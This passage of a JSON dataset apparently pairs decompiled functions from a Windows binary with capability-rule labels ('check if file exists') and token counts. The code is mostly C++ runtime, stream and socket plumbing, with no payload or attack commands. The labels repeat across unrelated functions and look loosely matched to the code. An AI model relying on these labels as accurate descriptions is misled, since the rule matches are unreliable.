            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004011f0(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    fcn.0041885b(0);\n    iVar1 = *(param_1 + 4);\n    if ((iVar1 != 0) && (iVar1 != -1)) {\n        *(param_1 + 4) = iVar1 + -1;\n    }\n    iVar1 = *(param_1 + 4);\n    fcn.0041887e();\n    return param_1 & (iVar1 != 0) - 1;\n}\n",
        "token_count": 127
    },
    "00401280": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00401280(int32_t param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = **(param_1 + 0x24);\n    *param_2 = iVar1;\n    fcn.0041885b(0);\n    if (*(iVar1 + 4) != -1) {\n        *(iVar1 + 4) = *(iVar1 + 4) + 1;\n    }\n    fcn.0041887e();\n    return param_2;\n}\n",
        "token_count": 125
    },
    "00401910": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401910(uint *param_1)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    \n    puVar1 = param_1[0xe];\n    *param_1 = 0x43d718;\n    if (puVar1 != NULL) {\n        uVar2 = *puVar1;\n        if (uVar2 != 0) {\n            fcn.0041885b(0);\n            iVar3 = *(uVar2 + 4);\n            if ((iVar3 != 0) && (iVar3 != -1)) {\n                *(uVar2 + 4) = iVar3 + -1;\n            }\n            puVar4 = uVar2 & (*(uVar2 + 4) != 0) - 1;\n            fcn.0041887e();\n            if (puVar4 != NULL) {\n                (***puVar4)(1);\n            }\n        }\n        fcn.0041bae1(puVar1);\n    }\n    fcn.00418f46();\n    return;\n}\n",
        "token_count": 250
    },
    "00402160": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint * fcn.00402160(void)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    char *pcStack60;\n    uint uStack48;\n    uint *puVar3;\n    int32_t iStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x43ad88;\n    iStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack12;\n    uStack48 = 0;\n    fcn.0041885b();\n    puVar1 = *0x44efa8;\n    uStack8 = 0;\n    puVar3 = *0x44efa8;\n    if (*0x451558 == 0) {\n        fcn.0041885b(0);\n        if (*0x451558 == 0) {\n            *0x451550 = *0x451550 + 1;\n            *0x451558 = *0x451550;\n        }\n        fcn.0041887e();\n    }\n    pcStack60 = fcn.0041890b(*0x451558);\n    if ((pcStack60 == NULL) && (pcStack60 = puVar1,  puVar1 == NULL)) {\n        pcStack60 = &uStack48;\n        iVar2 = fcn.00401830();\n        if (iVar2 == -1) {\n            pcStack60 = \"bad cast\";\n            fcn.0040aab3();\n            fcn.0040ab89(&stack0xffffffd8, 0x4474d0);\n        }\n        *0x44efa8 = pcStack60;\n        fcn.0041885b(0);\n        if (*(pcStack60 + 4) != -1) {\n            *(pcStack60 + 4) = *(pcStack60 + 4) + 1;\n        }\n        fcn.0041887e();\n        fcn.00418983();\n    }\n    fcn.0041887e();\n    *in_FS_OFFSET = puVar3;\n    return pcStack60;\n}\n",
        "token_count": 470
    },
    "00402370": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00402370(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if ((*(param_1 + *(*param_1 + 4) + 8) & 6) == 0) {\n        iVar1 = (**(**(param_1 + *(*param_1 + 4) + 0x28) + 0x2c))();\n        if (iVar1 == -1) {\n            uVar2 = 4;\n        }\n    }\n    if (uVar2 != 0) {\n        uVar2 = *(param_1 + *(*param_1 + 4) + 8) | uVar2;\n        if (*(param_1 + *(*param_1 + 4) + 0x28) == 0) {\n            uVar2 = uVar2 | 4;\n        }\n        fcn.00418dc7(uVar2, 0);\n    }\n    return param_1;\n}\n",
        "token_count": 232
    },
    "00402760": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.00402760(int32_t *param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint32_t arg_8h;\n    int32_t iVar5;\n    uint *puVar6;\n    uint *in_FS_OFFSET;\n    uint32_t var_8h;\n    uint var_10h;\n    uint var_18h;\n    uint var_14h;\n    uint var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43ab38;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    iVar5 = *(*param_1 + 4) + param_1;\n    if (*(*(*param_1 + 4) + 8 + param_1) == 0) {\n        if (*(iVar5 + 0x2c) != 0) {\n            fcn.00402370();\n        }\n        if ((var_8h == '\\0') && ((*(*(*param_1 + 4) + 0x10 + param_1) & 1) != 0)) {\n            uVar3 = fcn.00401280(&param_2);\n            var_4h = 0;\n            iVar5 = fcn.00402160(uVar3);\n            uVar4 = var_8h;\n            var_4h = 0xffffffff;\n            if (var_8h != 0) {\n                fcn.0041885b(0);\n                iVar1 = *(uVar4 + 4);\n                if ((iVar1 != 0) && (iVar1 != -1)) {\n                    *(uVar4 + 4) = iVar1 + -1;\n                }\n                puVar6 = uVar4 & (*(uVar4 + 4) != 0) - 1;\n                fcn.0041887e();\n                if (puVar6 != NULL) {\n                    (***puVar6)(1);\n                }\n            }\n            piVar2 = *(*(*param_1 + 4) + 0x28 + param_1);\n            var_4h = 1;\n            if ((*piVar2[8] == NULL) || (*piVar2[0xc] + *piVar2[8] <= *piVar2[8])) {\n                uVar4 = (**(*piVar2 + 0x10))();\n            }\n            else {\n                uVar4 = **piVar2[8];\n            }\n            while (uVar4 != 0xffffffff) {\n                if ((*(*(iVar5 + 0x10) + (uVar4 & 0xff) * 2) & 0x48) == 0) goto code_r0x004028d0;\n                uVar4 = fcn.004023d0();\n            }\n            uVar4 = *(*(*param_1 + 4) + 8 + param_1);\n            arg_8h = uVar4 | 1;\n            if (*(*(*param_1 + 4) + 0x28 + param_1) == 0) {\n                arg_8h = uVar4 | 5;\n            }\n            fcn.00418dc7(arg_8h, 0);\n        }\ncode_r0x004028d0:\n        iVar5 = *(*param_1 + 4) + param_1;\n        if (*(iVar5 + 8) == 0) {\n            *in_FS_OFFSET = var_ch;\n            return 1;\n        }\n    }\n    var_4h = 0xffffffff;\n    uVar4 = *(iVar5 + 8) | 2;\n    if (*(iVar5 + 0x28) == 0) {\n        uVar4 = *(iVar5 + 8) | 6;\n    }\n    uVar4 = fcn.00418dc7(uVar4, 0);\n    *in_FS_OFFSET = var_ch;\n    return uVar4 & 0xffffff00;\n}\n",
        "token_count": 909
    },
    "00403020": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl\nfcn.00403020(int32_t *noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6\n            , uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, \n            uint noname_13, uint noname_14, uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    uint *puVar7;\n    uint *in_FS_OFFSET;\n    char *var_ch_2;\n    uint var_10h;\n    int32_t *var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uchar *puStack20;\n    uint var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43abf0;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    puStack20 = &stack0xffffffc0;\n    var_14h = 0;\n    fcn.00402d80(noname_0, 0);\n    var_4h = 0;\n    pcVar6 = var_ch_2;\n    if (var_2ch != '\\0') {\n        uVar2 = fcn.00401280(&var_1ch);\n        var_4h._0_1_ = 1;\n        iVar3 = fcn.00402160(uVar2);\n        var_4h._0_1_ = 0;\n        if (var_1ch != 0) {\n            fcn.0041885b(0);\n            iVar5 = *(var_1ch + 4);\n            if ((iVar5 != 0) && (iVar5 != -1)) {\n                *(var_1ch + 4) = iVar5 + -1;\n            }\n            puVar7 = var_1ch & (*(var_1ch + 4) != 0) - 1;\n            fcn.0041887e();\n            if (puVar7 != NULL) {\n                (***puVar7)(1);\n            }\n        }\n        iVar5 = *(*(*noname_0 + 4) + 0x18 + noname_0);\n        var_4h = CONCAT31(var_4h._1_3_, 2);\n        if (iVar5 < 1) {\n            iVar5 = 0x7fffffff;\n        }\n        piVar1 = *(noname_0 + *(*noname_0 + 4) + 0x28);\n        var_18h = iVar5;\n        if ((*piVar1[8] == NULL) || (*piVar1[0xc] + *piVar1[8] <= *piVar1[8])) {\n            uVar4 = (**(*piVar1 + 0x10))();\n        }\n        else {\n            uVar4 = **piVar1[8];\n        }\n        while (iVar5 = iVar5 + -1,  0 < iVar5) {\n            if (uVar4 == 0xffffffff) {\n                var_14h = var_14h | 1;\n                break;\n            }\n            if (((*(*(iVar3 + 0x10) + (uVar4 & 0xff) * 2) & 0x48) != 0) || (uVar4 == '\\0')) break;\n            *pcVar6 = uVar4;\n            uVar4 = fcn.004023d0();\n            pcVar6 = pcVar6 + 1;\n        }\n    }\n    *pcVar6 = '\\0';\n    *(noname_0 + *(*noname_0 + 4) + 0x18) = 0;\n    var_4h = 0;\n    uVar4 = var_14h;\n    if (pcVar6 == var_ch_2) {\n        uVar4 = var_14h | 2;\n    }\n    if (uVar4 != 0) {\n        uVar4 = *(noname_0 + *(*noname_0 + 4) + 8) | uVar4;\n        if (*(noname_0 + *(*noname_0 + 4) + 0x28) == 0) {\n            uVar4 = uVar4 | 4;\n        }\n        fcn.00418dc7(uVar4, 0);\n    }\n    var_4h = 0xffffffff;\n    if (*(*(*var_30h + 4) + 0x28 + var_30h) != 0) {\n        fcn.00418f64();\n    }\n    *in_FS_OFFSET = var_ch;\n    return noname_0;\n}\n",
        "token_count": 1158
    },
    "004031f0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint * fcn.004031f0(void)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    char *pcStack60;\n    uint uStack48;\n    uint *puVar3;\n    int32_t iStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x43ad88;\n    iStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack12;\n    uStack48 = 0;\n    fcn.0041885b();\n    puVar1 = *0x44efac;\n    uStack8 = 0;\n    puVar3 = *0x44efac;\n    if (*0x44efb4 == 0) {\n        fcn.0041885b(0);\n        if (*0x44efb4 == 0) {\n            *0x44efb4 = *0x451550 + 1;\n            *0x451550 = *0x44efb4;\n        }\n        fcn.0041887e();\n    }\n    pcStack60 = fcn.0041890b(*0x44efb4);\n    if ((pcStack60 == NULL) && (pcStack60 = puVar1,  puVar1 == NULL)) {\n        pcStack60 = &uStack48;\n        iVar2 = fcn.00402c20();\n        if (iVar2 == -1) {\n            pcStack60 = \"bad cast\";\n            fcn.0040aab3();\n            fcn.0040ab89(&stack0xffffffd8, 0x4474d0);\n        }\n        *0x44efac = pcStack60;\n        fcn.0041885b(0);\n        if (*(pcStack60 + 4) != -1) {\n            *(pcStack60 + 4) = *(pcStack60 + 4) + 1;\n        }\n        fcn.0041887e();\n        fcn.00418983();\n    }\n    fcn.0041887e();\n    *in_FS_OFFSET = puVar3;\n    return pcStack60;\n}\n",
        "token_count": 482
    },
    "00403550": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __thiscall fcn.00403550(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    uint32_t arg_8h;\n    uint *puVar4;\n    uint *in_FS_OFFSET;\n    int32_t *var_8h;\n    uint var_10h;\n    uint var_3ch;\n    uint32_t var_38h;\n    int32_t *var_34h;\n    uint var_30h;\n    int32_t *var_2ch;\n    uint var_24h;\n    uint32_t var_20h;\n    int32_t var_1ch;\n    int32_t *var_18h;\n    uint32_t var_14h;\n    uchar *puStack20;\n    uint var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43ac50;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    puStack20 = &stack0xffffffb4;\n    var_14h = 0;\n    var_18h = param_1;\n    fcn.00402d80(param_1, 0);\n    var_4h = 0;\n    if (var_30h != '\\0') {\n        var_1ch = 0;\n        uVar2 = fcn.00401280(&var_20h);\n        var_4h._0_1_ = 1;\n        piVar3 = fcn.004031f0(uVar2);\n        var_4h._0_1_ = 0;\n        var_2ch = piVar3;\n        if (var_20h != 0) {\n            fcn.0041885b(0);\n            iVar1 = *(var_20h + 4);\n            if ((iVar1 != 0) && (iVar1 != -1)) {\n                *(var_20h + 4) = iVar1 + -1;\n            }\n            puVar4 = var_20h & (*(var_20h + 4) != 0) - 1;\n            fcn.0041887e();\n            if (puVar4 != NULL) {\n                (***puVar4)(1);\n            }\n        }\n        iVar1 = *(*(*param_1 + 4) + 0x28 + param_1);\n        var_38h = var_38h & 0xffffff00 | iVar1 == 0;\n        var_24h = CONCAT31(var_24h._1_3_, 1);\n        var_4h = CONCAT31(var_4h._1_3_, 2);\n        (**(*piVar3 + 0x20))(&var_3ch, iVar1, var_38h, 0, var_24h, *(*param_1 + 4) + param_1, &var_14h, &var_1ch);\n        if (((var_14h & 2) == 0) && (0x7fffffff < var_1ch)) {\n            *var_8h = var_1ch;\n        }\n        else {\n            var_14h = var_14h | 2;\n        }\n    }\n    var_4h = 0;\n    if (var_14h != 0) {\n        arg_8h = *(param_1 + *(*param_1 + 4) + 8) | var_14h;\n        if (*(param_1 + *(*param_1 + 4) + 0x28) == 0) {\n            arg_8h = arg_8h | 4;\n        }\n        fcn.00418dc7(arg_8h, 0);\n    }\n    var_4h = 0xffffffff;\n    if (*(*(*var_34h + 4) + 0x28 + var_34h) != 0) {\n        fcn.00418f64();\n    }\n    *in_FS_OFFSET = var_ch;\n    return param_1;\n}\n",
        "token_count": 919
    },
    "00404330": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00404330(int32_t **param_1)\n\n{\n    int32_t *piVar1;\n    uint32_t in_EAX;\n    \n    piVar1 = *param_1;\n    if (piVar1 != NULL) {\n        if ((*piVar1[8] == NULL) || (*piVar1[0xc] + *piVar1[8] <= *piVar1[8])) {\n            in_EAX = (**(*piVar1 + 0x10))();\n        }\n        else {\n            in_EAX = **piVar1[8];\n        }\n        if (in_EAX != 0xffffffff) {\n            *(param_1 + 5) = in_EAX;\n            *(param_1 + 1) = 1;\n            return in_EAX;\n        }\n    }\n    *param_1 = NULL;\n    *(param_1 + 1) = 1;\n    return in_EAX & 0xffffff00 | *(param_1 + 5);\n}\n",
        "token_count": 223
    },
    "004045b0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __thiscall\nfcn.004045b0(int32_t param_1, uint32_t param_2, uint param_3, uint param_4, uint param_5, uint param_6)\n\n{\n    uchar uVar1;\n    uint32_t uVar2;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint *puVar3;\n    uint unaff_retaddr;\n    \n    if (param_2 == 0xffffffff) {\n        fcn.00419265();\n    }\n    else if (param_2 != 0xffffffff) goto code_r0x004045d0;\n    fcn.00419265();\ncode_r0x004045d0:\n    if (*(param_1 + 0x18) < param_2) {\n        fcn.00402a30(param_2, *(param_1 + 0x14), unaff_ESI, unaff_EBP, unaff_retaddr, param_2, param_3, param_4, param_5\n                     , param_6);\n    }\n    else if (param_2 == 0) {\n        *(param_1 + 0x14) = 0;\n        if (0xf < *(param_1 + 0x18)) {\n            **(param_1 + 4) = 0;\n            return param_1;\n        }\n        *(param_1 + 4) = 0;\n        return param_1;\n    }\n    if (param_2 != 0) {\n        if (*(param_1 + 0x18) < 0x10) {\n            puVar3 = param_1 + 4;\n        }\n        else {\n            puVar3 = *(param_1 + 4);\n        }\n        uVar1 = unaff_retaddr;\n        for (uVar2 = param_2 >> 2; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *puVar3 = CONCAT22(CONCAT11(uVar1, uVar1), CONCAT11(uVar1, uVar1));\n            puVar3 = puVar3 + 1;\n        }\n        for (uVar2 = param_2 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *puVar3 = uVar1;\n            puVar3 = puVar3 + 1;\n        }\n        *(param_1 + 0x14) = param_2;\n        if (0xf < *(param_1 + 0x18)) {\n            *(*(param_1 + 4) + param_2) = 0;\n            return param_1;\n        }\n        *(param_1 + 4 + param_2) = 0;\n    }\n    return param_1;\n}\n",
        "token_count": 610
    },
    "00404670": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.00404670(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t unaff_ESI;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack40;\n    uint uStack32;\n    int32_t iStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x43ad88;\n    iStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffff4;\n    iStack40 = 0;\n    fcn.0041885b();\n    iStack40 = *0x44efb0;\n    uStack8 = 0;\n    if (*0x44efb8 == 0) {\n        fcn.0041885b();\n        if (*0x44efb8 == 0) {\n            *0x44efb8 = *0x451550 + 1;\n            *0x451550 = *0x44efb8;\n        }\n        fcn.0041887e();\n    }\n    iVar1 = fcn.0041890b(*0x44efb8);\n    if ((iVar1 == 0) && (iVar1 = unaff_ESI,  unaff_ESI == 0)) {\n        iVar1 = 0x404702;\n        iVar2 = fcn.00404780(&stack0xffffffd0);\n        if (iVar2 == -1) {\n            fcn.0040aab3(\"bad cast\");\n            iVar1 = 0x4474d0;\n            fcn.0040ab89(&stack0xffffffd8, 0x4474d0);\n        }\n        *0x44efb0 = iVar1;\n        fcn.0041885b(0);\n        if (*(iVar1 + 4) != -1) {\n            *(iVar1 + 4) = *(iVar1 + 4) + 1;\n        }\n        fcn.0041887e();\n        fcn.00418983();\n    }\n    uStack32 = 0xffffffff;\n    fcn.0041887e();\n    *in_FS_OFFSET = iStack40;\n    return iVar1;\n}\n",
        "token_count": 491
    },
    "0043a768": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0043a768(void)\n\n{\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CSocket.0;\n    *(unaff_EBP + -4) = 0;\n    if (extraout_ECX[1] != 0xffffffff) {\n        fcn.0043a6db();\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0043a65c();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 201
    },
    "00407fe0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00407fe0(char **param_1, char *param_2)\n\n{\n    char *pcVar1;\n    char cVar2;\n    code *pcVar3;\n    \n    if (param_2 == 0xffffffff) {\n        param_2 = *param_1;\n        if (param_2 != NULL) {\n            pcVar1 = param_2 + 1;\n            do {\n                cVar2 = *param_2;\n                param_2 = param_2 + 1;\n            } while (cVar2 != '\\0');\n            param_2 = param_2 + -pcVar1;\n            goto code_r0x00407ffc;\n        }\n    }\n    else {\ncode_r0x00407ffc:\n        if (param_2 < 0) goto code_r0x00408014;\n    }\n    if (param_2 <= *(*param_1 + -8)) {\n        *(*param_1 + -0xc) = param_2;\n        param_2[*param_1] = '\\0';\n        return;\n    }\ncode_r0x00408014:\n    fcn.004010c0(0x80070057);\n    pcVar3 = swi(3);\n    (*pcVar3)();\n    return;\n}\n",
        "token_count": 278
    },
    "004087dc": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool __thiscall fcn.004087dc(int32_t param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.WS2_32.dll_bind)(*(param_1 + 4), param_2, param_3);\n    return iVar1 != -1;\n}\n",
        "token_count": 78
    },
    "004098e8": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.004098e8(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint *in_ECX;\n    int64_t iVar1;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_4h;\n    \n    var_24h = arg_1ch;\n    var_20h = arg_18h;\n    var_1ch = arg_14h;\n    var_18h = arg_10h;\n    var_14h = arg_ch + -1;\n    var_10h = arg_8h + -0x76c;\n    var_4h = arg_20h;\n    iVar1 = fcn.0040cd83(&var_24h);\n    *in_ECX = iVar1;\n    in_ECX[1] = iVar1 >> 0x20;\n    if (iVar1 == -1) {\n        fcn.004010c0(0x80070057);\n    }\n    return;\n}\n",
        "token_count": 281
    },
    "0040a194": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.0040a194(int32_t param_1, int32_t param_2, uint param_3)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t extraout_ECX;\n    uchar *puVar4;\n    int32_t iVar5;\n    int32_t iStack12;\n    uint uStack8;\n    \n    puVar4 = &stack0xfffffffc;\n    if ((*(param_1 + 4) & 6) == 0) {\n        iStack12 = param_1;\n        uStack8 = param_3;\n        *(param_2 + -4) = &iStack12;\n        iVar5 = *(param_2 + 0xc);\n        iVar3 = *(param_2 + 8);\n        iVar2 = fcn.0040dfe4(param_2);\n        if (iVar2 == 0) {\n            *(param_1 + 4) = *(param_1 + 4) | 8;\n        }\n        else {\n            for (; iVar5 != -1; iVar5 = *(iVar3 + iVar5 * 0xc)) {\n                pcVar1 = *(iVar3 + 4 + iVar5 * 0xc);\n                if (pcVar1 != NULL) {\n                    iVar3 = (*pcVar1)();\n                    param_2 = *(puVar4 + 0xc);\n                    if (iVar3 != 0) {\n                        if (iVar3 < 0) {\n                            return 0;\n                        }\n                        iVar3 = *(param_2 + 8);\n                        fcn.0040a09c(param_2);\n                        puVar4 = param_2 + 0x10;\n                        fcn.0040a0de(param_2, iVar5);\n                        fcn.0040a172(1);\n                        *(param_2 + 0xc) = *(iVar3 + extraout_ECX * 4);\n                        param_2 = 0;\n                        iVar5 = 0;\n                        (**(iVar3 + 8 + extraout_ECX * 4))();\n                    }\n                }\n                iVar3 = *(param_2 + 8);\n            }\n        }\n    }\n    else {\n        fcn.0040a0de(param_2, 0xffffffff, &stack0xfffffffc, &stack0xfffffffc);\n    }\n    return 1;\n}\n",
        "token_count": 517
    },
    "00410f96": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00410f96(uint32_t arg_8h, int32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t arg_8h_00;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    piVar2 = arg_ch;\n    uVar1 = arg_ch[3];\n    arg_8h_00 = arg_ch[4];\n    if (((uVar1 & 0x82) == 0) || ((uVar1 & 0x40) != 0)) {\ncode_r0x004110a2:\n        arg_ch[3] = uVar1 | 0x20;\n    }\n    else {\n        if ((uVar1 & 1) != 0) {\n            arg_ch[1] = 0;\n            if ((uVar1 & 0x10) == 0) goto code_r0x004110a2;\n            *arg_ch = arg_ch[2];\n            arg_ch[3] = uVar1 & 0xfffffffe;\n        }\n        uVar1 = arg_ch[3];\n        arg_ch[1] = 0;\n        arg_ch = NULL;\n        piVar2[3] = uVar1 & 0xffffffef | 2;\n        if (((uVar1 & 0x10c) == 0) &&\n           (((piVar2 != 0x44e8d0 && (piVar2 != 0x44e8f0)) || (iVar3 = fcn.00415b68(arg_8h_00),  iVar3 == 0)))) {\n            fcn.00415b24(piVar2);\n        }\n        if ((*(piVar2 + 3) & 0x108) == 0) {\n            iVar3 = 1;\n            arg_ch = fcn.00415a79(arg_8h_00, &arg_8h, 1);\n        }\n        else {\n            iVar4 = piVar2[2];\n            iVar3 = *piVar2;\n            *piVar2 = iVar4 + 1;\n            iVar3 = iVar3 - iVar4;\n            piVar2[1] = piVar2[6] + -1;\n            if (iVar3 < 1) {\n                if (arg_8h_00 == 0xffffffff) {\n                    iVar4 = 0x44e658;\n                }\n                else {\n                    iVar4 = *((arg_8h_00 >> 5) * 4 + 0x452680) + (arg_8h_00 & 0x1f) * 0x24;\n                }\n                if ((*(iVar4 + 4) & 0x20) != 0) {\n                    fcn.00415800(arg_8h_00, 0, 2);\n                }\n            }\n            else {\n                arg_ch = fcn.00415a79(arg_8h_00, iVar4, iVar3);\n            }\n            *piVar2[2] = arg_8h;\n        }\n        if (arg_ch == iVar3) {\n            return arg_8h & 0xff;\n        }\n        piVar2[3] = piVar2[3] | 0x20;\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 729
    },
    "00416071": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t fcn.00416071(uint8_t **param_1)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    \n    puVar3 = param_1[3];\n    if (((puVar3 & 0x83) != 0) && ((puVar3 & 0x40) == 0)) {\n        if ((puVar3 & 2) == 0) {\n            param_1[3] = puVar3 | 1;\n            if ((puVar3 & 0x10c) == 0) {\n                fcn.00415b24(param_1);\n            }\n            else {\n                *param_1 = param_1[2];\n            }\n            puVar3 = fcn.00417513(param_1[4], param_1[2], param_1[6]);\n            param_1[1] = puVar3;\n            if ((puVar3 != NULL) && (puVar3 != 0xffffffff)) {\n                if ((param_1[3] & 0x82) == 0) {\n                    puVar2 = param_1[4];\n                    if (puVar2 == 0xffffffff) {\n                        iVar4 = 0x44e658;\n                    }\n                    else {\n                        iVar4 = *((puVar2 >> 5) * 4 + 0x452680) + (puVar2 & 0x1f) * 0x24;\n                    }\n                    if ((*(iVar4 + 4) & 0x82) == 0x82) {\n                        param_1[3] = param_1[3] | 0x2000;\n                    }\n                }\n                if (((param_1[6] == 0x200) && ((param_1[3] & 8) != 0)) && ((param_1[3] & 0x400) == 0)) {\n                    param_1[6] = 0x1000;\n                }\n                param_1[1] = puVar3 + -1;\n                uVar1 = **param_1;\n                *param_1 = *param_1 + 1;\n                return uVar1;\n            }\n            param_1[3] = param_1[3] | (-(puVar3 != NULL) & 0x10) + 0x10;\n            param_1[1] = NULL;\n        }\n        else {\n            param_1[3] = puVar3 | 0x20;\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 576
    },
    "0041a5e0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
